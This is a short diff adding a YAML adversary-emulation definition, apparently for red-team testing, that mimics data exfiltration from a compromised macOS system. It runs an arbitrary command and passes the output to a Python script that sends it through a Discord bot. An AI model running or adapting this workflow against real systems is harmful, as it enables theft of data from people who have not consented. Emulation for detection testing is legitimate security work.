@@ -1,0 +1,29 @@
+---
+api_version: 2.0
+uuid: 78192bdd-7406-441d-abfc-aa601ad81ceb
+name: Data Exfiltration via Discord
+authors:
+  - hmashru
+description: |
+  This TTP mimics an attacker exfilterating data via a Discord bot from a compromised macOS system provided a valid channel ID and bot token.
+requirements:
+  platforms:
+    - os: darwin
+mitre:
+  tactics:
+    - TA0010 Exfiltration
+  techniques:
+    - T1567 Exfiltration Over Web Service
+args:
+  - name: command
+    description: Command to execute on the target system and exfiltrate the output to Discord
+steps:
+  - name: Gather information
+    inline: |
+      echo "Gathering information about the system..."
+      {{.Args.command}}
+    outputvar: output
+  - name: Send data to Discord
+    inline: |
+      echo "Sending data to Discord..."
+      python3 exfil-discord.py '{[{.StepVars.output}]}'
